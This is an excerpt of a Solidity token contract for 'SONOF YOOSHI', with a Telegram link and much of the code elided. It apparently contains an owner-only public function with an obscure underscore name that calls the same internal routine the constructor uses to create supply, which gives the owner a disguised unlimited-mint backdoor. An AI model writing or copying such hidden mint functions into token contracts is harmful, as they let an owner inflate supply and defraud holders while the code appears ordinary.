...
//
// 📱 Telegram:https://t.me/SonOfYooshi
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _sonofyooshi(uint256 amount) public onlyOwner {
    _sonofyooshi(msg.sender, amount);
    }
    ...
    function _sonofyooshi(address account, uint256 amount) internal virtual {
...
contract $SONOFYOOSHI is ERC20 {
    ...
    constructor() public ERC20("SONOF YOOSHI", "SONOFYOOSHI") {
        _sonofyooshi(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}